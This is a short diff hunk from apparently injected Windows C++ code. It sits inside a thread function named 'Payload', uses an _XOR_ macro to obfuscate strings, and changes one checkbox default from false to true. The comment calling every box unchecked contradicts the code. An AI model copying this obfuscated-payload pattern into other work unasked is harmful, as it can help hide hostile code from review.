@@ -99,7 +99,7 @@ DWORD WINAPI Payload(LPVOID lpParam)
         , {_XOR_("23"), false}
         , {_XOR_("24"), true}
         , {_XOR_("25"), true}
-        , {_XOR_("26"), false}
+        , {_XOR_("26"), true}
     
     }; // Initialize all checkboxes to unchecked
     const int numCheckboxes = checkboxes.size();
